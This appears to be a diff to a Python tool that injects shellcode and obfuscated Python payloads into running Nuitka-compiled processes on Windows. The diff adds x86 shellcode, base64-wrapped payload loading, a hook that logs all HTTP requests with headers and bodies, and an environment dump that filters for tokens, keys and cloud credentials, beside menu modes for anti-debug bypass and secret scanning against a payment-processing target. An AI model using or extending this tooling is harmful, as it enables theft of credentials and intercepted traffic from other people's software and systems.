@@ -1,6 +1,7 @@
 import sys
 import os
 import ctypes
+import base64
 import struct
 import re
 from ctypes import wintypes
@@ -10,6 +11,7 @@ try:
     import psutil
     import pymem
     import pymem.process
+    import pefile
     from rich.console import Console
     from rich.table import Table
     from rich.panel import Panel
@@ -36,6 +38,16 @@ SE_DEBUG_NAME = "SeDebugPrivilege"
 SE_PRIVILEGE_ENABLED = 0x00000002
 
 
+class LUID(ctypes.Structure):
+    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]
+
+class LUID_AND_ATTRIBUTES(ctypes.Structure):
+    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]
+
+class TOKEN_PRIVILEGES(ctypes.Structure):
+    _fields_ = [("PrivilegeCount", wintypes.DWORD),
+                ("Privileges", LUID_AND_ATTRIBUTES * 1)]
+
 def is_admin() -> bool:
     try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
     except: return False
@@ -43,31 +55,67 @@ def is_admin() -> bool:
 def enable_debug_privilege() -> bool:
     try:
         h_token = wintypes.HANDLE()
-        h_proc = kernel32.GetCurrentProcess()
-        if not advapi32.OpenProcessToken(h_proc, 0x0020 | 0x0008, ctypes.byref(h_token)): return False
-        luid = ctypes.c_int64()
-        if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid)): return False
-        
-        class TOKEN_PRIVILEGES(ctypes.Structure):
-            _fields_ = [("Count", wintypes.DWORD), ("Privileges", (ctypes.c_char * 12))]
+        if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0028, ctypes.byref(h_token)): 
+            return False
+
+        luid = LUID()
+        if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid)):
+            kernel32.CloseHandle(h_token)
+            return False
+
         tp = TOKEN_PRIVILEGES()
-        tp.Count = 1
-        tp.Privileges = struct.pack('Q I', luid.value, SE_PRIVILEGE_ENABLED)
-        
-        advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp), 0, None, None)
+        tp.PrivilegeCount = 1
+        tp.Privileges[0].Luid = luid
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+        if not advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None):
+            kernel32.CloseHandle(h_token)
+            return False
+
+        if kernel32.GetLastError() == 1300: 
+            kernel32.CloseHandle(h_token)
+            return False
+
         kernel32.CloseHandle(h_token)
         return True
     except: return False
 
+class SYSTEM_INFO(ctypes.Structure):
+    _fields_ = [("wProcessorArchitecture", wintypes.WORD),
+                ("wReserved", wintypes.WORD),
+                ("dwPageSize", wintypes.DWORD),
+                ("lpMinimumApplicationAddress", ctypes.c_void_p),
+                ("lpMaximumApplicationAddress", ctypes.c_void_p),
+                ("dwActiveProcessorMask", ctypes.c_void_p),
+                ("dwNumberOfProcessors", wintypes.DWORD),
+                ("dwProcessorType", wintypes.DWORD),
+                ("dwAllocationGranularity", wintypes.DWORD),
+                ("wProcessorLevel", wintypes.WORD),
+                ("wProcessorRevision", wintypes.WORD)]
+
 def get_arch(pid: int) -> str:
+    sys_info = SYSTEM_INFO()
+    kernel32.GetNativeSystemInfo(ctypes.byref(sys_info))
+
+    os_arch_x64 = (sys_info.wProcessorArchitecture == 9)
+
+    if not os_arch_x64:
+        return "x86"
+
+    h = None
     try:
-        h = kernel32.OpenProcess(0x0400, False, pid)
+        h = kernel32.OpenProcess(0x1000, False, pid) # PROCESS_QUERY_LIMITED_INFORMATION
         if not h: return "Unknown"
+        
         wow64 = ctypes.c_bool()
-        kernel32.IsWow64Process(h, ctypes.byref(wow64))
-        kernel32.CloseHandle(h)
+        if not kernel32.IsWow64Process(h, ctypes.byref(wow64)):
+            return "Unknown"
+            
         return "x86" if wow64.value else "x64"
-    except: return "Unknown"
+    except: 
+        return "Unknown"
+    finally:
+        if h: kernel32.CloseHandle(h)
 
 def scan_procs() -> List[Dict]:
     res = []
@@ -202,9 +250,7 @@ def run():
     try:
         import __main__
 
-        # =======================================================
-        # (!) CONFIGURATION: TARGET FOR FUZZING
-        # =======================================================
+        # (!) конфигурация: таргет для фаззера
         
         # имя класса, который хотим сломать
         TARGET_CLASS_NAME = "PaymentProcessor" 
@@ -212,7 +258,7 @@ def run():
         # имя метода, который вызовем без аргументов, чтобы получить сигнатуру
         TARGET_METHOD_NAME = "process_transaction"
 
-        # =======================================================
+        # -------------------------------------------------------------------------
         
         lines.append(f"[*] Target: {TARGET_CLASS_NAME}.{TARGET_METHOD_NAME}")
 
@@ -264,7 +310,7 @@ def run():
         import __main__
 
         # =======================================================
-        # (!) WRITE YOUR INJECTION LOGIC HERE
+        # (!) напиши свой код тут
         # =======================================================
 
         # --- YOUR CODE: ---
@@ -513,17 +559,144 @@ try: run()
 except: pass
 """
 
+def payload_http_spy() -> str:
+    return get_common_header() + r"""
+def run():
+    lines = ["[*] Starting HTTP/HTTPS Sniffer"]
+    try:
+        import sys
+        import os
+        
+        if 'requests' not in sys.modules:
+            lines.append("[-] 'requests' module not loaded in target.")
+            save_log("nuitka_http_spy.txt", lines)
+            return
+
+        import requests
+        lines.append("[+] Hooking requests.Session.request")
+        
+        original_request = requests.Session.request
+        
+        def new_request(self, method, url, *args, **kwargs):
+            log_entry =  f"\n{'='*40}\n"
+            log_entry += f"[TIME] Request Intercepted\n"
+            log_entry += f"[REQ]  {method.upper()} {url}\n"
+            
+            headers = kwargs.get('headers')
+            if headers: log_entry += f"[HDR]  {headers}\n"
+            
+            data = kwargs.get('data')
+            if data:    log_entry += f"[DAT]  {data}\n"
+            
+            json_data = kwargs.get('json')
+            if json_data: log_entry += f"[JSN]  {json_data}\n"
+            
+            try:
+                path = os.path.join(os.environ.get("TEMP", "C:\\"), "nuitka_http_spy.txt")
+                with open(path, "a", encoding="utf-8") as f:
+                    f.write(log_entry)
+            except: pass
+            
+            return original_request(self, method, url, *args, **kwargs)
+            
+        requests.Session.request = new_request
+        lines.append("[*] Sniffer active. Check log file for updates.")
+
+    except Exception as e:
+        lines.append(f"[-] Sniffer Error: {e}")
+    
+    save_log("nuitka_http_spy.txt", lines)
+
+try: run()
+except: pass
+"""
+
+def payload_env_dump() -> str:
+    return get_common_header() + r"""
+def run():
+    lines = ["[*] Analyzing Process Environment"]
+    try:
+        import os
+        
+        keywords = [
+            'KEY', 'TOKEN', 'SECRET', 'PASS', 'AUTH', 'CRED',
+            'AWS', 'AZURE', 'GCP', 'GOOGLE', 'CLOUD',      
+            'DB', 'URL', 'CONNECTION', 'DSN', 'HOST',   
+            'API', 'CLIENT', 'USER', 'ADMIN', 'LOGIN',    
+            'PRIVATE', 'CERT', 'SSH', 'SALT', 'BUCKET'     
+        ]
+        
+        env_vars = dict(os.environ)
+        
+        if not env_vars:
+            lines.append("[-] Environment is empty.")
+        else:
+            lines.append(f"[*] Total variables: {len(env_vars)}\n")
+            
+            lines.append("--- [ Priority Keys ] ---")
+            found_secrets = False
+            for k, v in env_vars.items():
+                if any(x in k.upper() for x in keywords):
+                    lines.append(f"{k} = {v}")
+                    found_secrets = True
+            
+            if not found_secrets: lines.append("(No sensitive keys detected via keywords)")
+            
+            lines.append("\n--- [ System Environment ] ---")
+            for k, v in sorted(env_vars.items()):
+                if not any(x in k.upper() for x in keywords):
+                    lines.append(f"{k} = {v}")
+
+    except Exception as e:
+        lines.append(f"[-] Error: {e}")
+    
+    save_log("nuitka_env.txt", lines)
+
+try: run()
+except: pass
+"""
 
 def get_remote_func(pm, dll_path, func_name):
     try:
-        local_lib = ctypes.CDLL(dll_path)
-        local_addr = ctypes.cast(getattr(local_lib, func_name), ctypes.c_void_p).value
-        offset = local_addr - local_lib._handle
-        remote_mod = pymem.process.module_from_name(pm.process_handle, os.path.basename(dll_path))
-        return remote_mod.lpBaseOfDll + offset if remote_mod else 0
-    except: return 0
+        pe = pefile.PE(dll_path)
+        
+        func_rva = None
+        func_name_b = func_name.encode('utf-8') 
+        
+        export_directory = None
+        for d in pe.OPTIONAL_HEADER.DATA_DIRECTORY:
+            if d.name == 'IMAGE_DIRECTORY_ENTRY_EXPORT':
+                export_directory = d
+                break
 
-def inject(pid: int, dll_path: str, payload: str) -> bool:
+        if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
+            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
+                if exp.name and exp.name == func_name_b:
+                    
+                    if export_directory and \
+                       export_directory.VirtualAddress <= exp.address < export_directory.VirtualAddress + export_directory.Size:
+                        console.print(f"[yellow][!] Skipped forwarder export: {func_name}[/yellow]")
+                        return 0
+                        
+                    func_rva = exp.address
+                    break
+        
+        pe.close()
+        
+        if not func_rva:
+            return 0
+            
+        remote_mod = pymem.process.module_from_name(pm.process_handle, os.path.basename(dll_path))
+        if not remote_mod:
+            return 0
+            
+        return remote_mod.lpBaseOfDll + func_rva
+
+    except Exception as e:
+        console.print(f"[red][!] Error resolving address for {func_name}: {e}[/red]")
+        return 0
+
+def inject(pid: int, dll_path: str, payload: str, arch: str) -> bool:
     try:
         pm = pymem.Pymem(pid)
         addr_run = get_remote_func(pm, dll_path, "PyRun_SimpleString")
@@ -531,19 +704,36 @@ def inject(pid: int, dll_path: str, payload: str) -> bool:
         addr_release = get_remote_func(pm, dll_path, "PyGILState_Release")
         
         if not (addr_run and addr_ensure and addr_release):
-            console.print("[red]✗ Failed to resolve Python API[/red]")
+            console.print("[red]✗ Failed to resolve Python API (Check arch mismatch)[/red]")
             return False
 
-        b_payload = payload.encode('utf-8') + b'\x00'
+        payload_b64 = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
+        loader_code = f"import base64; exec(base64.b64decode('{payload_b64}'))"  
+        b_payload = loader_code.encode('utf-8') + b'\x00'
+
         mem_data = pm.allocate(len(b_payload))
         pm.write_bytes(mem_data, b_payload, len(b_payload))
         
-        sc = b'\x48\x83\xEC\x28\x48\xB8\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xFF\xD0\x48\x89\xC3\x48\xB9\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\x48\xB8\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xFF\xD0\x48\x89\xD9\x48\xB8\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xFF\xD0\x48\x83\xC4\x28\xC3'
-        sc = sc.replace(b'\xAA' * 8, struct.pack('<Q', addr_ensure))
-        sc = sc.replace(b'\xBB' * 8, struct.pack('<Q', mem_data))
-        sc = sc.replace(b'\xCC' * 8, struct.pack('<Q', addr_run))
-        sc = sc.replace(b'\xDD' * 8, struct.pack('<Q', addr_release))
-        
+        if arch == "x86":
+            # шеллкод для x86 (32 бит)
+            pack_fmt = '<I'
+            sc = b'\xB8\xAA\xAA\xAA\xAA\xFF\xD0\x89\xC6\x68\xBB\xBB\xBB\xBB\xB8\xCC\xCC\xCC\xCC\xFF\xD0\x83\xC4\x04\x56\xB8\xDD\xDD\xDD\xDD\xFF\xD0\x83\xC4\x04\xC3'
+            
+            sc = sc.replace(b'\xAA' * 4, struct.pack(pack_fmt, addr_ensure))
+            sc = sc.replace(b'\xBB' * 4, struct.pack(pack_fmt, mem_data))
+            sc = sc.replace(b'\xCC' * 4, struct.pack(pack_fmt, addr_run))
+            sc = sc.replace(b'\xDD' * 4, struct.pack(pack_fmt, addr_release))
+            
+        else:
+            # шеллкод для x64
+            pack_fmt = '<Q'
+            sc = b'\x48\x83\xEC\x28\x48\xB8\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xFF\xD0\x48\x89\xC3\x48\xB9\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\x48\xB8\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xFF\xD0\x48\x89\xD9\x48\xB8\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xFF\xD0\x48\x83\xC4\x28\xC3'
+            
+            sc = sc.replace(b'\xAA' * 8, struct.pack(pack_fmt, addr_ensure))
+            sc = sc.replace(b'\xBB' * 8, struct.pack(pack_fmt, mem_data))
+            sc = sc.replace(b'\xCC' * 8, struct.pack(pack_fmt, addr_run))
+            sc = sc.replace(b'\xDD' * 8, struct.pack(pack_fmt, addr_release))
+
         mem_sc = pm.allocate(len(sc))
         pm.write_bytes(mem_sc, sc, len(sc))
         
@@ -569,7 +759,9 @@ def show_menu():
     table.add_row("4", "Payday", "Execute Custom Script")
     table.add_row("5", "Anti-Anti-Debug", "Bypass IsDebuggerPresent & Inject Action")
     table.add_row("6", "Deep Scan", "Scan full memory (GC) for hidden secrets")
-    table.add_row("7", "MITM Hook", "Intercept & Log real user transactions")
+    table.add_row("7", "MITM Hook", "Intercept function calls & arguments")
+    table.add_row("8", "HTTP Spy", "Log all requests (HTTPS Bypass)")
+    table.add_row("9", "Environment", "Dump os.environ (Config & Keys)")
     
     console.print(table)
 
@@ -603,8 +795,8 @@ def main():
             continue
             
         show_menu()
-        mode = Prompt.ask("Select [cyan]Payload Mode[/cyan] [cyan][1-7/q][/cyan]", 
-                         choices=["1", "2", "3", "4", "5", "6", "7", "q"], 
+        mode = Prompt.ask("Select [cyan]Payload Mode[/cyan] [cyan][1-9/q][/cyan]", 
+                         choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "q"], 
                          show_choices=False)
         if mode == 'q': break
         
@@ -618,8 +810,10 @@ def main():
         elif mode == "5": payload = payload_anti_anti_debug(); report_file = "nuitka_anti_anti_debug.txt"
         elif mode == "6": payload = payload_deep_scan(); report_file = "nuitka_deepscan.txt"
         elif mode == "7": payload = payload_mitm(); report_file = "nuitka_mitm_log.txt"
+        elif mode == "8": payload = payload_http_spy(); report_file = "nuitka_http_spy.txt"
+        elif mode == "9": payload = payload_env_dump(); report_file = "nuitka_env.txt"
             
-        if inject(tgt['pid'], tgt['dll_path'], payload):
+        if inject(tgt['pid'], tgt['dll_path'], payload, tgt['arch']):
             console.print(f"\n[bold green]SUCCESS![/bold green] Payload executed.")
             path = os.path.join(os.environ.get("TEMP", "C:\\"), report_file)
             console.print(f"Report: [underline]{path}[/underline] or C:\\{report_file}\n")
